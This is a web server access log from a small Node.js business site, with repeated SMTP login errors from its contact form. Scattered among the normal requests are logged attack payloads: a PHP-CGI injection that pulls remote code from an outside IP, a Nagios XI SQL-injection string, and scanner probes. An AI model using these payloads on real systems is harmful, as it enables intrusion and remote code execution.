[0mGET /contact [32m200 [0m3.653 ms - 8629[0m
[0mGET /courses [36m304 [0m4.729 ms - -[0m
[0mGET /index [32m200 [0m3.245 ms - 10182[0m
[0mGET / [32m200 [0m3.214 ms - 10182[0m
[0mGET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n [33m404 [0m2.627 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m1.984 ms - 4377[0m
[0mGET / [32m200 [0m3.652 ms - 10182[0m
[0mGET /contact [32m200 [0m2.815 ms - 8629[0m
[0mGET /index [32m200 [0m3.769 ms - 10182[0m
[0mGET /courses [32m200 [0m4.746 ms - 13968[0m
[0mGET /products [32m200 [0m3.053 ms - 7515[0m
[0mGET /contact/send/mail [33m404 [0m2.278 ms - 4377[0m
[0mGET /portfolio-item.html [33m404 [0m1.990 ms - 4377[0m
[0mGET / [32m200 [0m3.544 ms - 10182[0m
[0mGET /index.html [33m404 [0m3.013 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.565 ms - 4377[0m
[0mHEAD / [32m200 [0m3.629 ms - 10182[0m
[0mGET / [32m200 [0m3.455 ms - 10182[0m
[0mGET / [32m200 [0m4.457 ms - 10182[0m
[0mGET /services [32m200 [0m4.888 ms - 14452[0m
[0mHEAD /nagiosxi/includes/components/nagiosim/nagiosim.php?mode=resolve&host=%27AND%28SELECT%201%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%28%28SELECT%20backend_ticket%20FROM%20xi_users%20WHERE%20user_id%3D1%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20 [33m404 [0m2.030 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m2.015 ms - 4377[0m
[0mGET / [32m200 [0m4.028 ms - 10182[0m
[0mGET /automotriz.html [33m404 [0m3.430 ms - 4377[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.004 ms - 4377[0m
[0mGET / [32m200 [0m4.009 ms - 10182[0m
[0mGET / [32m200 [0m3.478 ms - 10182[0m
[0mGET / [32m200 [0m3.653 ms - 10182[0m
[0mGET / [32m200 [0m3.971 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m1.959 ms - 4377[0m
[0mGET / [32m200 [0m4.059 ms - 10182[0m
[0mGET / [32m200 [0m4.607 ms - 10182[0m
[0mGET / [32m200 [0m3.676 ms - 10182[0m
[0mGET / [32m200 [0m4.001 ms - 10182[0m
[0mGET /cgi/common.cgi [33m404 [0m2.057 ms - 4377[0m
[0mGET /stssys.htm [33m404 [0m1.975 ms - 4377[0m
[0mGET / [32m200 [0m3.933 ms - 10182[0m
[0mPOST /command.php [33m404 [0m2.460 ms - 4377[0m
[0mGET /index [32m200 [0m8.509 ms - 10182[0m
[0mGET / [32m200 [0m4.795 ms - 10182[0m
[0mGET /modelado-3d.html [33m404 [0m1.977 ms - 4377[0m
[0mGET / [32m200 [0m3.620 ms - 10182[0m
[0mGET / [32m200 [0m3.018 ms - 10182[0m
[0mGET / [32m200 [0m3.764 ms - 10182[0m
[0mGET / [32m200 [0m3.556 ms - 10182[0m
[0mGET / [32m200 [0m3.022 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.527 ms - 4377[0m
[0mGET / [32m200 [0m2.955 ms - 10182[0m
[0mGET / [32m200 [0m3.641 ms - 10182[0m
[0mGET / [32m200 [0m3.583 ms - 10182[0m
[0mGET /uploads/3/4/7/6/34766560/1469625458.png [33m404 [0m2.000 ms - 4377[0m
[0mGET / [32m200 [0m3.806 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.805 ms - 4377[0m
[0mGET /index.html [33m404 [0m1.980 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.534 ms - 4377[0m
[0mGET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n [33m404 [0m1.929 ms - 4377[0m
[0mGET /index.html [33m404 [0m1.944 ms - 4377[0m
[0mGET / [32m200 [0m3.069 ms - 10182[0m
[0mGET /w00tw00t.at.ISC.SANS.DFind:) [33m404 [0m2.725 ms - 4377[0m
[0mGET / [32m200 [0m3.192 ms - 10182[0m
[0mGET /contact [32m200 [0m2.794 ms - 8629[0m
[0mGET /products [32m200 [0m2.597 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m2.875 ms - 4377[0m
[0mGET /contact [36m304 [0m3.761 ms - -[0m
[0mGET /contact [32m200 [0m3.264 ms - 8629[0m
[0mGET /contact [32m200 [0m3.517 ms - 8629[0m
[0mGET / [36m304 [0m3.075 ms - -[0m
[0mGET /contact [32m200 [0m9.740 ms - 8629[0m
[0mGET /contact [32m200 [0m5.274 ms - 8629[0m
[0mGET / [32m200 [0m7.245 ms - 10182[0m
[0mGET /index.html [33m404 [0m3.536 ms - 4377[0m
[0mGET / [32m200 [0m5.323 ms - 10182[0m
[0mGET / [32m200 [0m4.087 ms - 10182[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m4.807 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m2.124 ms - 4377[0m
[0mGET / [32m200 [0m4.340 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.663 ms - 4377[0m
[0mGET / [32m200 [0m3.852 ms - 10182[0m
[0mGET / [32m200 [0m3.589 ms - 10182[0m
[0mGET / [32m200 [0m5.744 ms - 10182[0m
[0mGET / [32m200 [0m3.065 ms - 10182[0m
[0mGET / [32m200 [0m3.648 ms - 10182[0m
[0mGET / [32m200 [0m3.526 ms - 10182[0m
[0mHEAD http://180.163.113.82/check_proxy [33m404 [0m2.243 ms - 4377[0m
[0mGET / [32m200 [0m3.437 ms - 10182[0m
[0mGET / [32m200 [0m3.197 ms - 10182[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m3.557 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m2.472 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.917 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.080 ms - 4377[0m
[0mGET /mfzctchsgihkme.html [33m404 [0m2.104 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m3.449 ms - 4377[0m
[0mGET / [32m200 [0m3.115 ms - 10182[0m
[0mGET /xmlrpc.php?rsd [33m404 [0m2.498 ms - 4377[0m
[0mGET /blog/robots.txt [33m404 [0m2.136 ms - 4377[0m
[0mGET /blog/ [33m404 [0m2.091 ms - 4377[0m
[0mGET /wordpress/ [33m404 [0m2.087 ms - 4377[0m
[0mGET /wp/ [33m404 [0m2.087 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m2.621 ms - 4377[0m
[0mGET /administrator/index.php [33m404 [0m4.161 ms - 4377[0m
[0mGET /blog/robots.txt [33m404 [0m2.094 ms - 4377[0m
[0mGET /blog/administrator/index.php [33m404 [0m2.521 ms - 4377[0m
[0mGET /joomla/robots.txt [33m404 [0m2.822 ms - 4377[0m
[0mGET /joomla/administrator/index.php [33m404 [0m2.136 ms - 4377[0m
[0mGET / [32m200 [0m4.899 ms - 10182[0m
[0mGET / [32m200 [0m3.820 ms - 10182[0m
[0mGET / [32m200 [0m3.860 ms - 10182[0m
[0mGET /services [32m200 [0m10.387 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m3.287 ms - 4377[0m
[0mGET / [32m200 [0m5.960 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m3.242 ms - 4377[0m
[0mGET / [32m200 [0m3.643 ms - 10182[0m
[0mGET / [32m200 [0m3.567 ms - 10182[0m
[0mGET / [32m200 [0m3.085 ms - 10182[0m
[0mGET /m/ [33m404 [0m2.549 ms - 4377[0m
[0mGET / [32m200 [0m3.113 ms - 10182[0m
[0mGET /uploads/3/4/7/6/34766560/14064065-1781962562052100-1963609768905615141-n-1_orig.jpg [33m404 [0m2.915 ms - 4377[0m
[0mGET / [32m200 [0m3.795 ms - 10182[0m
[0mGET / [32m200 [0m3.704 ms - 10182[0m
[0mGET /wp-admin/logo_img.php [33m404 [0m2.404 ms - 4377[0m
[0mGET /wp-includes/logo_img.php [33m404 [0m2.680 ms - 4377[0m
[0mGET / [32m200 [0m3.237 ms - 10182[0m
[0mGET /courses [32m200 [0m7.074 ms - 13968[0m
[0mGET /services [32m200 [0m5.546 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m3.337 ms - 4377[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.055 ms - 4377[0m
[0mGET /products [32m200 [0m4.294 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m3.157 ms - 4377[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m1.984 ms - 4377[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m1.953 ms - 4377[0m
[0mGET /hndUnblock.cgi [33m404 [0m2.701 ms - 4377[0m
[0mGET /tmUnblock.cgi [33m404 [0m2.133 ms - 4377[0m
[0mGET / [32m200 [0m8.802 ms - 10182[0m
[0mGET / [32m200 [0m3.572 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.096 ms - 4377[0m
[0mGET /index.html [33m404 [0m1.944 ms - 4377[0m
[0mGET /index.html [33m404 [0m5.659 ms - 4377[0m
[0mGET / [32m200 [0m3.160 ms - 10182[0m
[0mGET /manager/html [33m404 [0m4.340 ms - 4377[0m
[0mGET / [32m200 [0m3.056 ms - 10182[0m
[0mGET /recordings/index.php [33m404 [0m2.506 ms - 4377[0m
[0mGET /recordings/index.php [33m404 [0m1.695 ms - 4377[0m
[0mGET / [32m200 [0m3.779 ms - 10182[0m
[0mGET / [32m200 [0m3.512 ms - 10182[0m
[0mGET /wp-content/plugins/ubh/up.php [33m404 [0m1.998 ms - 4377[0m
[0mGET /wp-content/logo_img.php [33m404 [0m1.895 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m2.513 ms - 4377[0m
[0mGET /contact [32m200 [0m5.188 ms - 8629[0m
[0mGET /courses [32m200 [0m5.388 ms - 13968[0m
[0mGET /products [32m200 [0m3.787 ms - 7515[0m
[0mGET /robots.txt [33m404 [0m2.187 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.643 ms - 4377[0m
[0mGET / [32m200 [0m4.695 ms - 10182[0m
[0mGET /contact [36m304 [0m2.940 ms - -[0m
[0mGET / [32m200 [0m3.941 ms - 10182[0m
[0mGET /courses [32m200 [0m3.982 ms - 13968[0m
[0mGET /portfolio-item.html [33m404 [0m2.166 ms - 4377[0m
[0mGET /portfolio-item.html [33m404 [0m2.164 ms - 4377[0m
[0mGET /products [32m200 [0m3.188 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m2.049 ms - 4377[0m
[0mGET /contact [32m200 [0m3.302 ms - 8629[0m
{ Error: Invalid login: 534-5.7.14 <https://accounts.google.com/signin/continue?sarp=1&scc=1&plt=AKgnsbu9
534-5.7.14 _4PNCNUEjwsYhTt85hei3MB-H1gcyRztJ-HdpyhMC9GTpgqqqp_vutjbUk5u5LkuiEV-jg
534-5.7.14 s34dMN1Ovmm-ak-EF27dqn-Q4oTkUmvBcHsD7jN9quSQSn5V3d_NhnuxLyzowyDMVxwxbk
534-5.7.14 qNRYSQv54yssWOezrudcOixAHWeMwm3uixxvq7fjX7tbjdxVW8xtxLltYCXifTAzsOvaAi
534-5.7.14 DJ0mOCKZengqCkUMo_gWf5rAGiNTc> Please log in via your web browser and
534-5.7.14 then try again.
534-5.7.14  Learn more at
534 5.7.14  https://support.google.com/mail/answer/78754 p7sm10374524pfb.125 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '534-5.7.14 <https://accounts.google.com/signin/continue?sarp=1&scc=1&plt=AKgnsbu9\n534-5.7.14 _4PNCNUEjwsYhTt85hei3MB-H1gcyRztJ-HdpyhMC9GTpgqqqp_vutjbUk5u5LkuiEV-jg\n534-5.7.14 s34dMN1Ovmm-ak-EF27dqn-Q4oTkUmvBcHsD7jN9quSQSn5V3d_NhnuxLyzowyDMVxwxbk\n534-5.7.14 qNRYSQv54yssWOezrudcOixAHWeMwm3uixxvq7fjX7tbjdxVW8xtxLltYCXifTAzsOvaAi\n534-5.7.14 DJ0mOCKZengqCkUMo_gWf5rAGiNTc> Please log in via your web browser and\n534-5.7.14 then try again.\n534-5.7.14  Learn more at\n534 5.7.14  https://support.google.com/mail/answer/78754 p7sm10374524pfb.125 - gsmtp',
  responseCode: 534,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m599.885 ms - -[0m
{ Error: Invalid login: 534-5.7.14 <https://accounts.google.com/signin/continue?sarp=1&scc=1&plt=AKgnsbuI
534-5.7.14 66a530IZO-FcvMfroxbVSQX8wqH3uV9VVxhFUAIVaC3ID5EvJYMWGzyoFhDS8ymsUGbleb
534-5.7.14 ws9N87_JuVO7OP6iRGXCfRfmwXcchC-mi_RIJ0yjO0p6BTMxlbue313lCWNwwGN7Ix0YON
534-5.7.14 0o-vLald-PthSd2Z-VNvyn2Lz1OS426J5I_Rve3u1J31YL47GW0GnLJNbPgPzhurze4fSU
534-5.7.14 m4GOSmkOliD3lMcIVUprLmXEWsqf4> Please log in via your web browser and
534-5.7.14 then try again.
534-5.7.14  Learn more at
534 5.7.14  https://support.google.com/mail/answer/78754 k190sm9127405pge.2 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '534-5.7.14 <https://accounts.google.com/signin/continue?sarp=1&scc=1&plt=AKgnsbuI\n534-5.7.14 66a530IZO-FcvMfroxbVSQX8wqH3uV9VVxhFUAIVaC3ID5EvJYMWGzyoFhDS8ymsUGbleb\n534-5.7.14 ws9N87_JuVO7OP6iRGXCfRfmwXcchC-mi_RIJ0yjO0p6BTMxlbue313lCWNwwGN7Ix0YON\n534-5.7.14 0o-vLald-PthSd2Z-VNvyn2Lz1OS426J5I_Rve3u1J31YL47GW0GnLJNbPgPzhurze4fSU\n534-5.7.14 m4GOSmkOliD3lMcIVUprLmXEWsqf4> Please log in via your web browser and\n534-5.7.14 then try again.\n534-5.7.14  Learn more at\n534 5.7.14  https://support.google.com/mail/answer/78754 k190sm9127405pge.2 - gsmtp',
  responseCode: 534,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m453.338 ms - -[0m
{ Error: Invalid login: 535-5.7.8 Username and Password not accepted. Learn more at
535 5.7.8  https://support.google.com/mail/?p=BadCredentials i30sm11513320pgn.39 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '535-5.7.8 Username and Password not accepted. Learn more at\n535 5.7.8  https://support.google.com/mail/?p=BadCredentials i30sm11513320pgn.39 - gsmtp',
  responseCode: 535,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m379.011 ms - -[0m
{ Error: Invalid login: 535-5.7.8 Username and Password not accepted. Learn more at
535 5.7.8  https://support.google.com/mail/?p=BadCredentials y69sm148118pfb.56 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '535-5.7.8 Username and Password not accepted. Learn more at\n535 5.7.8  https://support.google.com/mail/?p=BadCredentials y69sm148118pfb.56 - gsmtp',
  responseCode: 535,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m359.149 ms - -[0m
{ Error: Invalid login: 535-5.7.8 Username and Password not accepted. Learn more at
535 5.7.8  https://support.google.com/mail/?p=BadCredentials 76sm9408103pgf.28 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '535-5.7.8 Username and Password not accepted. Learn more at\n535 5.7.8  https://support.google.com/mail/?p=BadCredentials 76sm9408103pgf.28 - gsmtp',
  responseCode: 535,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m381.440 ms - -[0m
{ Error: Invalid login: 535-5.7.8 Username and Password not accepted. Learn more at
535 5.7.8  https://support.google.com/mail/?p=BadCredentials y5sm15737671pge.19 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '535-5.7.8 Username and Password not accepted. Learn more at\n535 5.7.8  https://support.google.com/mail/?p=BadCredentials y5sm15737671pge.19 - gsmtp',
  responseCode: 535,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m376.237 ms - -[0m
{ Error: Invalid login: 535-5.7.8 Username and Password not accepted. Learn more at
535 5.7.8  https://support.google.com/mail/?p=BadCredentials j4sm11014597pfk.91 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '535-5.7.8 Username and Password not accepted. Learn more at\n535 5.7.8  https://support.google.com/mail/?p=BadCredentials j4sm11014597pfk.91 - gsmtp',
  responseCode: 535,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m380.687 ms - -[0m
[0mGET /phpmyadmin [33m404 [0m2.230 ms - 4377[0m
[0mGET / [32m200 [0m3.780 ms - 10182[0m
{ Error: Invalid login: 535-5.7.8 Username and Password not accepted. Learn more at
535 5.7.8  https://support.google.com/mail/?p=BadCredentials 20sm15811943pfq.42 - gsmtp
    at SMTPConnection._formatError (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:557:19)
    at SMTPConnection._actionAUTHComplete (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:1248:34)
    at SMTPConnection._responseActions.push.str (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:340:26)
    at SMTPConnection._processResponse (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:706:20)
    at SMTPConnection._onData (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:509:14)
    at TLSSocket._socket.on.chunk (/home/ubuntu/mextech/mexprinter/node_modules/nodemailer/lib/smtp-connection/index.js:461:47)
    at emitOne (events.js:96:13)
    at TLSSocket.emit (events.js:188:7)
    at readableAddChunk (_stream_readable.js:176:18)
    at TLSSocket.Readable.push (_stream_readable.js:134:10)
  code: 'EAUTH',
  response: '535-5.7.8 Username and Password not accepted. Learn more at\n535 5.7.8  https://support.google.com/mail/?p=BadCredentials 20sm15811943pfq.42 - gsmtp',
  responseCode: 535,
  command: 'AUTH PLAIN' }
[0mPOST /contact/send/mail [32m200 [0m675.660 ms - -[0m
[0mGET /wp-content/common.php [33m404 [0m2.100 ms - 4377[0m
[0mGET / [32m200 [0m3.744 ms - 10182[0m
[0mGET /courses [32m200 [0m4.032 ms - 13968[0m
[0mGET /services [32m200 [0m4.457 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.958 ms - 4377[0m
[0mGET /public/stylesheets/bootstrap.min.css.map [33m404 [0m2.035 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.672 ms - 4377[0m
[0mGET /index.html [33m404 [0m1.996 ms - 4377[0m
[0mGET http://clientapi.ipip.net/echo.php?info=20170429081223 [33m404 [0m2.063 ms - 4377[0m
[0mGET / [32m200 [0m3.664 ms - 10182[0m
[0mGET / [32m200 [0m3.615 ms - 10182[0m
[0mGET / [32m200 [0m3.049 ms - 10182[0m
[0mGET / [32m200 [0m3.594 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.063 ms - 4377[0m
[0mGET /sitemap.xml [33m404 [0m2.518 ms - 4377[0m
[0mGET / [32m200 [0m3.044 ms - 10182[0m
[0mGET / [36m304 [0m3.135 ms - -[0m
[0mGET /courses [32m200 [0m10.025 ms - 13968[0m
[0mGET /services [32m200 [0m5.517 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.028 ms - 4377[0m
[0mGET / [32m200 [0m3.826 ms - 10182[0m
[0mGET /services [32m200 [0m5.177 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.159 ms - 4377[0m
[0mGET /products [32m200 [0m3.553 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m1.955 ms - 4377[0m
[0mGET /index [32m200 [0m4.242 ms - 10182[0m
[0mGET /index [32m200 [0m3.761 ms - 10182[0m
[0mGET /courses [32m200 [0m5.104 ms - 13968[0m
[0mGET /courses [36m304 [0m20.413 ms - -[0m
[0mGET /portfolio-item.html [33m404 [0m3.454 ms - 4377[0m
[0mGET /portfolio-item.html [33m404 [0m4.827 ms - 4377[0m
[0mGET /portfolio-item.html [33m404 [0m3.685 ms - 4377[0m
[0mGET /services [36m304 [0m8.667 ms - -[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m3.446 ms - 4377[0m
[0mGET /services [36m304 [0m9.109 ms - -[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m7.818 ms - 4377[0m
[0mGET /index [36m304 [0m5.964 ms - -[0m
[0mGET /contact [32m200 [0m4.159 ms - 8629[0m
[0mGET /products [32m200 [0m4.575 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m3.122 ms - 4377[0m
[0mGET /contact [36m304 [0m4.468 ms - -[0m
[0mGET /robots.txt [33m404 [0m4.598 ms - 4377[0m
[0mGET / [32m200 [0m4.053 ms - 10182[0m
[0mGET / [32m200 [0m4.248 ms - 10182[0m
[0mGET / [32m200 [0m3.528 ms - 10182[0m
[0mGET / [32m200 [0m4.180 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.913 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.727 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.086 ms - 4377[0m
[0mHEAD /robots.txt [33m404 [0m2.095 ms - 4377[0m
[0mGET / [32m200 [0m3.505 ms - 10182[0m
[0mGET / [32m200 [0m3.550 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.505 ms - 4377[0m
[0mGET /portfolio-item.html [33m404 [0m3.092 ms - 4377[0m
[0mGET /invoker/JMXInvokerServlet [33m404 [0m2.730 ms - 4377[0m
[0mGET /invoker/JMXInvokerServlet [33m404 [0m2.108 ms - 4377[0m
[0mGET / [32m200 [0m3.968 ms - 10182[0m
[0mGET / [32m200 [0m3.626 ms - 10182[0m
[0mGET / [32m200 [0m3.333 ms - 10182[0m
[0mGET /services [32m200 [0m4.451 ms - 14452[0m
[0mGET / [32m200 [0m3.758 ms - 10182[0m
[0mGET / [32m200 [0m3.816 ms - 10182[0m
[0mGET / [32m200 [0m3.341 ms - 10182[0m
[0mGET / [32m200 [0m6.383 ms - 10182[0m
[0mGET / [32m200 [0m11.422 ms - 10182[0m
[0mGET / [32m200 [0m14.031 ms - 10182[0m
[0mGET / [32m200 [0m17.143 ms - 10182[0m
[0mGET / [32m200 [0m4.324 ms - 10182[0m
[0mGET / [32m200 [0m4.607 ms - 10182[0m
